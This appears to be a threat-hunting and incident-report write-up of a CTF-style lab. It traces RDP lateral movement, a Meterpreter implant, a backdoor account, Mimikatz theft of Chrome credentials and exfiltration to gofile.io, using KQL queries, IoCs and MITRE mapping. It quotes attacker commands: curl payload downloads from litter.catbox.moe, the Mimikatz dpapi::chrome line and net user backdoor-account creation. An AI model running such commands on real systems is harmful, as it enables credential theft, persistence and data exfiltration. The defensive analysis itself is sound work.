<img width="503" height="753" alt="image" src="https://github.com/user-attachments/assets/3423287d-8b85-4ff4-a452-e8f43763a32b" />

# Threat-Hunt-Bridge-Takeover

Executive Summary
Incident ID: INC2025-0011-020
Incident Severity: Severity 1 (Critical)
Incident Status: Resolved

Incident Overview
Following a confirmed compromise of the account yuki.tanaka during the initial intrusion (CTF 1 – Port of Entry), the unauthorized entity leveraged the same credentials to perform lateral movement from the previously compromised system (10.1.0.204) to the administrative workstation azuki-adminpc. The attacker conducted extensive reconnaissance, deployed a Metasploit-based C2 implant, established persistence through a backdoor account, performed credential harvesting across multiple data sources, and exfiltrated sensitive financial and credential data to the cloud file-sharing service gofile.io.

Key Findings
The compromised account yuki.tanaka was reused for lateral movement via Remote Desktop Protocol (RDP) from IP 10.1.0.204 to azuki-adminpc. Once on the administrative workstation, the attacker downloaded a password-protected 7-Zip archive disguised as a Windows security update (KB5044273-x64.7z) from the file hosting service litter.catbox.moe using curl.exe. Extraction of this archive revealed a Metasploit Meterpreter implant (meterpreter.exe) along with additional offensive tools including m.exe (a Mimikatz variant) and silentlynx.exe.
The C2 implant established a named pipe (\Device\NamedPipe\msf-pipe-5902) for inter-process communication. Obfuscated PowerShell commands were executed to create a backdoor account (yuki.tanaka2) and escalate it to the local Administrators group. The attacker performed extensive discovery actions including RDP session enumeration (qwinsta.exe), domain trust enumeration (nltest.exe), network connection mapping (NETSTAT.EXE -ano), and targeted searches for password databases (.kdbx files) and credential files (OLD-Passwords.lnk).
Data was staged in a hidden directory (C:\ProgramData\Microsoft\Crypto\staging) mimicking legitimate Windows paths. Robocopy.exe was used to systematically collect financial documents including banking records, QuickBooks data, tax records, and contracts. A total of 8 archives were created for exfiltration. Browser credential theft was conducted using Mimikatz (m.exe) to extract saved Chrome login data. All stolen data was exfiltrated via curl.exe HTTP POST requests to store1.gofile.io (IP: 45.112.123.227). The master password for a KeePass database was also extracted and saved to KeePass-Master-Password.txt.

Immediate Actions
The SOC and DFIR teams initiated incident response procedures upon detection. The compromised workstation azuki-adminpc was immediately isolated via VLAN segmentation. The accounts yuki.tanaka and yuki.tanaka2 (backdoor) were disabled in Active Directory. Firewall rules were updated to block all communications with gofile.io, litter.catbox.moe, and the exfiltration server IP 45.112.123.227. All event logs were preserved and collected by the existing SIEM for forensic analysis.

Technical Analysis
Affected Systems & Data
Devices
azuki-adminpc – Administrative/executive workstation (primary target)

Accounts
yuki.tanaka – Compromised account used for lateral movement and all attacker activity
yuki.tanaka2 – Backdoor account created by attacker for persistence

Evidence Sources & Analysis
Lateral Movement 
Querying DeviceLogonEvents for RemoteInteractive sessions on Azuki devices revealed the compromised account yuki.tanaka authenticating to azuki-adminpc from source IP 10.1.0.204. This IP corresponds to the system compromised during the initial breach (CTF 1). Multiple successful RDP logon events were observed spanning November 24–25, 2025, confirming sustained lateral movement.
DeviceLogonEvents | where DeviceName contains "azuki" | where ActionType == "LogonSuccess" | where LogonType == "RemoteInteractive" | project TimeGenerated, DeviceName, AccountName, LogonType, RemoteIP | order by TimeGenerated desc
<img width="1182" height="609" alt="Screenshot 2026-04-13 173133" src="https://github.com/user-attachments/assets/ecc26d3b-ef07-4e47-9142-5297d7e80d94" />

Malware Delivery 
Analysis of DeviceNetworkEvents on azuki-adminpc filtered for curl.exe connections with successful outbound connections revealed two external file-hosting services contacted by the attacker. The first connection at 2025-11-25T04:21:12.0783558Z reached litter.catbox.moe (IP: 108.181.20.36) to download the malicious archive. The full download command was:
"curl.exe" -L -o C:\Windows\Temp\cache\KB5044273-x64.7z https://litter.catbox.moe/gfdb9v.7z
The archive was disguised as a Windows cumulative security update (KB5044273) to avoid suspicion. Subsequent process execution logs showed the archive was extracted using 7-Zip with a password parameter:
"7z.exe" x C:\Windows\Temp\cache\KB5044273-x64.7z -p******** -oC:\Windows\Temp\cache\ -y
<img width="1699" height="394" alt="Screenshot 2026-04-13 182742" src="https://github.com/user-attachments/assets/075b3622-ae5c-47ee-b809-23108cd26136" />
<img width="1703" height="631" alt="Screenshot 2026-04-13 182817" src="https://github.com/user-attachments/assets/aa58066f-10ec-4815-af4d-58c9f62b029c" />
<img width="1702" height="463" alt="Screenshot 2026-04-13 183649" src="https://github.com/user-attachments/assets/e491921d-3209-4435-89b8-60a104f40912" />



C2 Implant & Named Pipe
Querying DeviceFileEvents for executable and script file creations in the extraction timeframe on azuki-adminpc revealed three malicious files extracted from the archive at 2025-11-25T04:21:33Z: meterpreter.exe (the primary C2 beacon), silentlynx.exe, and m.exe (Mimikatz credential theft tool).
Analysis of DeviceEvents for NamedPipeEvent actions on azuki-adminpc, with JSON parsing of the AdditionalFields to extract PipeName, identified two Metasploit framework named pipes created by the meterpreter.exe process:
\Device\NamedPipe\msf-pipe-5902  (created at 04:24:35)
\Device\NamedPipe\msf-pipe-5722  (created at 05:36:54)
The "msf-pipe" naming pattern is a well-known Metasploit Framework indicator of compromise and confirms active C2 communication channels.
<img width="1325" height="648" alt="Screenshot 2026-04-13 185105" src="https://github.com/user-attachments/assets/70322bd0-56e3-485c-90cb-cab05c6c0836" />
<img width="1718" height="611" alt="Screenshot 2026-04-14 175802" src="https://github.com/user-attachments/assets/ccb66d3f-4ad9-4a5c-a116-32cb0b86907e" />



Obfuscated Commands – Account Creation & Privilege Escalation
DeviceProcessEvents queries filtered for PowerShell executions with -EncodedCommand parameters on azuki-adminpc under the yuki.tanaka account revealed two Base64-encoded commands. Decoding these commands exposed:
Account creation command:
net user yuki.tanaka2 B@ckd00r2024! /add
Privilege escalation command:
net localgroup Administrators yuki.tanaka2 /add
The backdoor account yuki.tanaka2 was crafted to closely resemble the legitimate yuki.tanaka account, making it difficult to detect through casual inspection. The account was immediately elevated to the local Administrators group, granting full system privileges.
<img width="1598" height="420" alt="Screenshot 2026-04-14 182131" src="https://github.com/user-attachments/assets/567a0301-d1ff-42e4-8284-644d828e59ac" />
<img width="1527" height="606" alt="Screenshot 2026-04-14 182708" src="https://github.com/user-attachments/assets/4bf5c7bc-4430-4a2b-a211-0786ad681d94" />



Discovery & Reconnaissance

The attacker executed a systematic series of discovery commands to map the environment, identify targets, and locate credentials: 
| Timestamp | Technique | Command | Purpose |
|-----------|-----------|---------|---------|
| 04:08:58 | T1033 | `qwinsta.exe` | Enumerate active RDP sessions to identify logged-in users |
| 04:09:25 | T1482 | `"nltest.exe" /domain_trusts /all_trusts` | Enumerate domain trust relationships for lateral movement paths |
| 04:10:07 | T1049 | `"NETSTAT.EXE" -ano` | Map active network connections and listening services |
| 04:13:45 | T1552.001 | `cmd.exe /c where /r C:\Users *.kdbx` | Search for KeePass password database files |
| 04:15:57 | T1552.001 | OLD-Passwords.lnk discovered | Plaintext password file found on user Desktop |
<img width="1482" height="495" alt="Screenshot 2026-04-17 174532" src="https://github.com/user-attachments/assets/0ce9f992-f870-43e3-a2b2-01aac95c8a87" />
<img width="1582" height="596" alt="Screenshot 2026-04-17 161622" src="https://github.com/user-attachments/assets/6cde73fe-eb35-427b-ad2a-03b1a92e57d3" />
<img width="1561" height="421" alt="Screenshot 2026-04-17 162714" src="https://github.com/user-attachments/assets/45313237-9d5d-4ea1-85f7-9676c4abb361" />
<img width="1690" height="495" alt="Screenshot 2026-04-17 163205" src="https://github.com/user-attachments/assets/aced4669-f958-46f6-bf7a-2d33bb31c76d" />
<img width="1601" height="592" alt="Screenshot 2026-04-17 163507" src="https://github.com/user-attachments/assets/a8dd4285-44a6-448a-86b8-e7e837b958a0" />

Data Staging & Collection

The attacker established a staging directory at C:\ProgramData\Microsoft\Crypto\staging, deliberately choosing a path that mimics legitimate Windows cryptographic service directories to avoid detection. DeviceFileEvents confirmed file creations under this path by the robocopy.exe process.
Robocopy.exe was used with retry and performance flags (/E /R:1 /W:1 /NP) to systematically copy user documents into the staging directory. The following data categories were collected:
 
| Timestamp | Source Directory | Staging Subdirectory |
|-----------|-----------------|----------------------|
| 04:28:09 | C:\Users\yuki.tanaka\Documents\QuickBooks | staging\QuickBooks |
| 04:37:03 | C:\Users\yuki.tanaka\Documents\Banking | staging\Banking |
| 04:37:22 | C:\Users\yuki.tanaka\Documents\Tax-Records | staging\Tax-Records |
| 04:37:38 | C:\Users\yuki.tanaka\Documents\Contracts | staging\Contracts |
DeviceFileEvents filtered for archive file creations (.zip, .tar, .gz, .7z, .rar) confirmed a total of 8 distinct archives were created for exfiltration, including: credentials.tar.gz, tax-documents.tar.gz, banking-records.tar.gz (among others). The initial malware archive KB5044273-x64.7z was also present but was part of the delivery, not exfiltration.
<img width="1611" height="611" alt="Screenshot 2026-04-17 175225" src="https://github.com/user-attachments/assets/388fd92b-a1a1-4b7f-9e71-ce770ffdbea9" />
<img width="1692" height="610" alt="Screenshot 2026-04-17 165807" src="https://github.com/user-attachments/assets/1deff236-1520-49a3-90e9-74344f564757" />
<img width="1474" height="600" alt="Screenshot 2026-04-17 170947" src="https://github.com/user-attachments/assets/071a8338-9f26-41b9-9ea3-b02e0dc75cd1" />

Credential Theft
A second download from litter.catbox.moe was observed at 2025-11-25T05:55:34Z, retrieving an additional credential theft tool:
"curl.exe" -L -o m-temp.7z https://litter.catbox.moe/mt97cj.7z
After extraction, the Mimikatz tool (m.exe) was executed to harvest saved browser credentials from Google Chrome:
"m.exe" privilege::debug "dpapi::chrome /in:%localappdata%\Google\Chrome\User Data\Default\Login Data /unprotect" exit
Additionally, DeviceFileEvents on azuki-adminpc revealed the creation of KeePass-Master-Password.txt in the user Documents directory, indicating extraction of the master password for the KeePass password manager. This would grant the attacker access to all credentials stored within the KeePass vault.
<img width="1660" height="619" alt="Screenshot 2026-04-17 171613" src="https://github.com/user-attachments/assets/55c543e5-4f67-4008-8975-b8e6b67ca901" />
<img width="1710" height="615" alt="Screenshot 2026-04-17 171908" src="https://github.com/user-attachments/assets/db08f80a-2ff7-4747-a8d3-3abcdd35186e" />
<img width="999" height="640" alt="Screenshot 2026-04-17 175433" src="https://github.com/user-attachments/assets/335cd698-5d12-4bd9-9378-ddcabbc29f48" />

Exfiltration
 
| Timestamp | File Uploaded | Destination |
|-----------|---------------|-------------|
| 04:41:51 | credentials.tar.gz | store1.gofile.io/uploadFile |
| 04:42:04 | quickbooks-data.tar.gz | store1.gofile.io/uploadFile |
| 04:42:13 | banking-records.tar.gz | store1.gofile.io/uploadFile |
| 04:42:23 | tax-documents.tar.gz | store1.gofile.io/uploadFile |
| 04:42:33 | contracts-data.tar.gz | store1.gofile.io/uploadFile |
| 04:49:19 | chrome-credentials.tar.gz | store1.gofile.io/uploadFile |
| 05:56:50 | chrome-session-theft.tar.gz | store1.gofile.io/uploadFile |
DeviceNetworkEvents confirmed the exfiltration destination server IP as 45.112.123.227, with connections originating from the local IP 10.1.0.108 on azuki-adminpc
<img width="1464" height="628" alt="Screenshot 2026-04-17 172149" src="https://github.com/user-attachments/assets/3dfad6a7-d472-4fea-9f32-3fc330dd42c4" />
<img width="1269" height="620" alt="Screenshot 2026-04-17 172717" src="https://github.com/user-attachments/assets/6830e050-6b91-4114-8422-4745c74ebb36" />



Network IoCs
 
| Type | Value | Context |
|------|-------|---------|
| IP Address | 10.1.0.204 | Lateral movement source (compromised system from CTF 1) |
| IP Address | 108.181.20.36 | litter.catbox.moe — malware hosting |
| IP Address | 45.112.123.227 | store1.gofile.io — data exfiltration endpoint |
| Domain | litter.catbox.moe | File hosting service used to stage malware |
| Domain | store1.gofile.io | Cloud storage service used for exfiltration |
| URL | https://litter.catbox.moe/gfdb9v.7z | Malware archive download URL |
| URL | https://litter.catbox.moe/mt97cj.7z | Credential theft tool download URL |


Host IoCs
 
| Type | Value | Context |
|------|-------|---------|
| File | meterpreter.exe | C2 beacon (Metasploit) |
| File | m.exe | Mimikatz credential theft tool |
| File | silentlynx.exe | Additional offensive tool |
| File | KB5044273-x64.7z | Malware archive masquerading as Windows update |
| Named Pipe | \\Device\\NamedPipe\\msf-pipe-5902 | Metasploit C2 named pipe |
| Named Pipe | \\Device\\NamedPipe\\msf-pipe-5722 | Metasploit C2 named pipe |
| Directory | C:\Windows\Temp\cache\ | Malware extraction directory |
| Directory | C:\ProgramData\Microsoft\Crypto\staging\ | Data staging directory |
| Account | yuki.tanaka2 (password: B@ckd00r2024!) | Backdoor administrator account |
| File | KeePass-Master-Password.txt | Extracted master password file |


Technical Timeline

All timestamps are in UTC, November 25, 2025 
| Time (UTC) | MITRE ATT&CK | Activity |
|------------|---------------|----------|
| ~04:06:52 | T1078 / T1021.001 | Lateral movement via RDP: yuki.tanaka authenticates to azuki-adminpc from 10.1.0.204 |
| 04:08:58 | T1033 | RDP session enumeration: qwinsta.exe |
| 04:09:25 | T1482 | Domain trust enumeration: nltest.exe /domain_trusts /all_trusts |
| 04:10:07 | T1049 | Network connection enumeration: NETSTAT.EXE -ano |
| 04:13:45 | T1552.001 | Password database search: where /r C:\Users *.kdbx |
| 04:15:57 | T1552.001 | Credential file discovered: OLD-Passwords.lnk |
| 04:21:11 | T1105 / T1608.001 | Malware download: curl.exe downloads KB5044273-x64.7z from litter.catbox.moe |
| 04:21:32 | T1140 | Archive extraction: 7z.exe extracts password-protected archive to cache directory |
| 04:21:33 | T1059 | C2 implant deployed: meterpreter.exe, m.exe, silentlynx.exe extracted |
| 04:24:35 | T1090.001 | Named pipe created: \\Device\\NamedPipe\\msf-pipe-5902 by meterpreter.exe |
| 04:28:09 | T1074.001 / T1119 | Data staging begins: Robocopy copies QuickBooks data to staging directory |
| 04:34:06 | T1027 | Encoded PowerShell: backdoor account yuki.tanaka2 created |
| 04:37:03 | T1119 | Banking documents copied to staging directory |
| 04:41:51 | T1567.002 | Exfiltration begins: credentials.tar.gz uploaded to gofile.io |
| 04:42:33 | T1567.002 | Continued exfiltration: financial archives uploaded sequentially |
| 04:49:19 | T1567.002 | Chrome credentials exfiltrated: chrome-credentials.tar.gz |
| 04:51:23 | T1078.003 / T1027 | Encoded PowerShell: yuki.tanaka2 added to local Administrators group |
| 05:36:54 | T1090.001 | Second named pipe: \\Device\\NamedPipe\\msf-pipe-5722 |
| 05:55:34 | T1105 | Second tool download: m-temp.7z from litter.catbox.moe |
| 05:55:54 | T1555.003 | Browser credential theft: m.exe extracts Chrome saved passwords |
| 05:56:50 | T1567.002 | Final exfiltration: chrome-session-theft.tar.gz uploaded |
| 06:05:01 | T1059 | SILENTLYNX_README.txt created — possible secondary implant activity |
| 06:10:24 | T1070.003 | Anti-forensics: ConsoleHost_history.txt deleted |
 
---
 
## MITRE ATT&CK Technique Mapping
 
| Tactic | Technique ID | Technique Name | Evidence |
|--------|-------------|----------------|----------|
| Lateral Movement | T1021.001 | Remote Desktop Protocol | RDP logon from 10.1.0.204 to azuki-adminpc |
| Lateral Movement | T1078 | Valid Accounts | Reuse of yuki.tanaka credentials |
| Execution | T1059 | Command & Scripting Interpreter | PowerShell encoded commands, meterpreter.exe |
| Execution | T1105 | Ingress Tool Transfer | curl.exe downloads from litter.catbox.moe |
| Defense Evasion | T1140 | Deobfuscate/Decode Files | Password-protected 7z archive extraction |
| Defense Evasion | T1027 | Obfuscated Files/Information | Base64-encoded PowerShell commands |
| Defense Evasion | T1036 | Masquerading | Archive named as Windows KB update |
| Persistence | T1136.001 | Create Account: Local | yuki.tanaka2 backdoor account created |
| Privilege Escalation | T1078.003 | Valid Accounts: Local | Backdoor added to Administrators group |
| Discovery | T1033 | System Owner/User Discovery | qwinsta.exe RDP session enumeration |
| Discovery | T1482 | Domain Trust Discovery | nltest.exe /domain_trusts /all_trusts |
| Discovery | T1049 | System Network Connections | NETSTAT.EXE -ano |
| Credential Access | T1552.001 | Credentials In Files | Search for .kdbx and OLD-Passwords.lnk |
| Credential Access | T1555.003 | Credentials from Web Browsers | m.exe dpapi::chrome extraction |
| Credential Access | T1555.005 | Password Stores | KeePass-Master-Password.txt extraction |
| Collection | T1074.001 | Local Data Staging | Staging at C:\ProgramData\Microsoft\Crypto\staging |
| Collection | T1119 | Automated Collection | Robocopy.exe bulk document copying |
| Collection | T1560.001 | Archive Collected Data | 8 archives created for exfiltration |
| Command and Control | T1090.001 | Internal Proxy | msf-pipe named pipes for C2 |
| Exfiltration | T1567.002 | Exfiltration to Cloud Storage | HTTP POST uploads to gofile.io |
| Defense Evasion | T1070.003 | Indicator Removal: Clear History | ConsoleHost_history.txt deleted |


Root Cause Analysis
The root cause of this incident traces directly to the initial compromise documented in the preceding investigation (CTF 1 – Port of Entry). The account yuki.tanaka was compromised during the initial breach and the credentials were not reset promptly, allowing the attacker to reuse them for lateral movement to the administrative workstation azuki-adminpc.
Contributing factors include insufficient network segmentation that permitted unrestricted RDP access between workstations, a lack of multi-factor authentication on RDP sessions, and the absence of application whitelisting that would have prevented execution of meterpreter.exe and other unsigned offensive tools. The presence of plaintext credential files (OLD-Passwords.lnk) and a KeePass database with an extractable master password further compounded the exposure.

Response and Recovery
Immediate Response Actions
Isolated azuki-adminpc from the network via VLAN segmentation
Disabled both yuki.tanaka and yuki.tanaka2 accounts in Active Directory
Blocked C2 and exfiltration domains/IPs at the perimeter firewall
Preserved all forensic evidence including SIEM logs, memory dumps, and disk images

Eradication Measures
Removed meterpreter.exe, silentlynx.exe, m.exe, and all associated staging directory contents
Deleted the backdoor account yuki.tanaka2
Rotated credentials for yuki.tanaka and all accounts whose passwords were stored in the compromised KeePass vault or OLD-Passwords.lnk file
Cleared all Chrome saved passwords on the affected system and forced re-authentication

Post-Incident Recommendations
Enforce multi-factor authentication for all RDP and remote access sessions
Implement network segmentation restricting lateral RDP access between workstations
Deploy application whitelisting to prevent execution of unauthorized binaries
Implement Data Loss Prevention (DLP) controls to detect and block bulk data exfiltration to anonymous cloud storage services
Prohibit storage of credentials in plaintext files; enforce use of enterprise password management solutions with hardware-backed MFA
Create detection rules for Metasploit named pipe patterns (msf-pipe-*), encoded PowerShell commands, and curl-based exfiltration to file-sharing services
Conduct organization-wide credential reset for all accounts that may have been exposed through the compromised KeePass vault




